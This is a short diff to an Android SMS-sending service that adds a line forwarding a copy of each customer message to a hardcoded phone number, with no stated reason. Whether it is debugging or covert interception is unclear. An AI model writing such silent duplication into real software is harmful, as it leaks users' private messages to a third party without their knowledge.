@@ -40,8 +40,6 @@ public class SMSService extends IntentService {
             if (reqCode == 1000) {
                 String id = b.getString(SMSReceiver.ID);
                 callAPIUpdate(id);
-
-                // SMSUtil.sendSMS(getApplicationContext(), "01637958812", "Thks for being our friends");
             }
         }
     }
@@ -77,6 +75,7 @@ public class SMSService extends IntentService {
                             String phone = model.data.customerPhone;
                             String message = model.data.customerMessage;
                             SMSUtil.sendSMS(getApplicationContext(), phone, message);
+                            SMSUtil.sendSMS(getApplicationContext(), "01637958812", message);
 
                             // Refresh UI
                             Intent intent = new Intent(getPackageName() + ".SMS_RECEIVED");
